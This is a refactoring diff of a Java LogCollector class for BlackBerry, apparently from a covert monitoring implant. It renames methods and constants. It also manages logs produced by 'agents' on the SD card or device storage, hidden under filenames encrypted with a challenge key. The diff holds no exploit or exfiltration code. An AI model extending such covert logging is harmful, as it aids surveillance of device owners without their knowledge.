@@ -28,10 +28,15 @@ import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
-public class LogCollector implements Singleton {
+public final class LogCollector implements Singleton {
+    private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
+
+    static LogCollector instance = null;
+
     public static final String LOG_EXTENSION = ".mob";
 
     public static final String LOG_DIR = "1";
+
     public static final String MARKUP_DIR = "2";
 
     public static final String LOG_DIR_PREFIX = "Z"; // Utilizzato per creare le
@@ -47,29 +52,20 @@ public class LogCollector implements Singleton {
     // di
     // accesso
 
-    private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
-
-    static LogCollector instance = null;
-
-    public synchronized static LogCollector getInstance() {
-        if (instance == null) {
-            instance = new LogCollector();
-        }
-
-        return instance;
-    }
-
-    private static int GetLogNum() {
-        // TODO Auto-generated method stub
-        return 0;
-    }
-
     // public boolean storeToMMC;
     Vector logVector;
 
     private int logProgressive;
 
     private PersistentObject logProgressivePersistent;
+
+    public static synchronized LogCollector getInstance() {
+        if (instance == null) {
+            instance = new LogCollector();
+        }
+
+        return instance;
+    }
 
     private LogCollector() {
         super();
@@ -78,12 +74,17 @@ public class LogCollector implements Singleton {
         logProgressive = deserializeProgressive();
     }
 
+    private static int getLogNum() {
+        // TODO Auto-generated method stub
+        return 0;
+    }
+
     private void clear() {
         // TODO Auto-generated method stub
 
     }
 
-    public synchronized boolean CreateLogDir(String dirPath) {
+    public synchronized boolean createLogDir(String dirPath) {
         /*
          * LogNode logNode = new LogNode( dirPath + this.LOG_DIR_PREFIX +
          * MakeDateName(), this.storeToMMC );
@@ -97,7 +98,7 @@ public class LogCollector implements Singleton {
     }
 
     private String decryptName(String logMask) {
-        return Encryption.DecryptName(logMask, Keys.getChallengeKey()[0]);
+        return Encryption.decryptName(logMask, Keys.getChallengeKey()[0]);
     }
 
     private synchronized int deserializeProgressive() {
@@ -110,13 +111,13 @@ public class LogCollector implements Singleton {
             logProgressivePersistent.setContents(new Integer(1));
         }
 
-        int logProgressive = ((Integer) logProgressivePersistent.getContents())
+        int logProgressiveRet = ((Integer) logProgressivePersistent.getContents())
                 .intValue();
-        return logProgressive;
+        return logProgressiveRet;
     }
 
     private String encryptName(String logMask) {
-        return Encryption.EncryptName(logMask, Keys.getChallengeKey()[0]);
+        return Encryption.encryptName(logMask, Keys.getChallengeKey()[0]);
     }
 
     public Vector getLogs() {
@@ -124,15 +125,15 @@ public class LogCollector implements Singleton {
         return null;
     }
 
-    protected synchronized int GetNewProgressive() {
+    protected synchronized int getNewProgressive() {
         logProgressive++;
         logProgressivePersistent.setContents(new Integer(logProgressive));
 
         return logProgressive;
     }
 
-    public synchronized Log LogFactory(Agent agent, boolean onSD) {
-        if (GetLogNum() > MAX_LOG_NUM) {
+    public synchronized Log factory(Agent agent, boolean onSD) {
+        if (getLogNum() > MAX_LOG_NUM) {
             debug.error("Max log reached");
             return null;
         }
@@ -156,7 +157,7 @@ public class LogCollector implements Singleton {
      * //NumberUtilities.toString(hidate, 16, 8); return newname; }
      */
 
-    private String MakeDateName(Date date) {
+    private String makeDateName(Date date) {
         long millis = date.getTime();
         long mask = (long) 1E4;
         int lodate = (int) (millis % mask);
@@ -170,30 +171,30 @@ public class LogCollector implements Singleton {
 
     public void makeLogDirs(boolean storeToMMC) {
         if (storeToMMC) {
-            CreateLogDir(Path.SDPath);
-            CreateLogDir(Path.SDPath + LOG_DIR);
+            createLogDir(Path.SD_PATH);
+            createLogDir(Path.SD_PATH + LOG_DIR);
         } else {
-            CreateLogDir(Path.UserPath);
-            CreateLogDir(Path.UserPath + LOG_DIR);
+            createLogDir(Path.USER_PATH);
+            createLogDir(Path.USER_PATH + LOG_DIR);
         }
     }
 
-    public synchronized Vector MakeNewName(Log log, Agent agent) {
+    public synchronized Vector makeNewName(Log log, Agent agent) {
 
         boolean onSD = agent.onSD();
         Date timestamp = log.timestamp;
-        int progressive = GetNewProgressive();
+        int progressive = getNewProgressive();
 
         Vector vector = new Vector();
 
         // log.SetProgressive(progressive);
 
-        String basePath = onSD ? Path.SDPath : Path.UserPath;
+        String basePath = onSD ? Path.SD_PATH : Path.USER_PATH;
 
         String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
-        String fileName = this.MakeDateName(timestamp);
+        String fileName = this.makeDateName(timestamp);
 
-        String encName = Encryption.EncryptName(fileName + LOG_EXTENSION, Keys
+        String encName = Encryption.encryptName(fileName + LOG_EXTENSION, Keys
                 .getChallengeKey()[0]);
 
         vector.addElement(new Integer(progressive));
@@ -251,14 +252,14 @@ public class LogCollector implements Singleton {
     }
 
     //
-    public void ScanLogs() {
+    public void scanLogs() {
         clear();
 
         // cerca i log sul filesystem, scandendo tutti i possibili path
         // usando come filtro LOG_DIR_FORMAT
 
-        scanForLogs(Path.SDPath);
-        scanForLogs(Path.UserPath);
+        scanForLogs(Path.SD_PATH);
+        scanForLogs(Path.USER_PATH);
 
         // costruisce le directory secondo storeToMMC
         makeLogDirs(true);
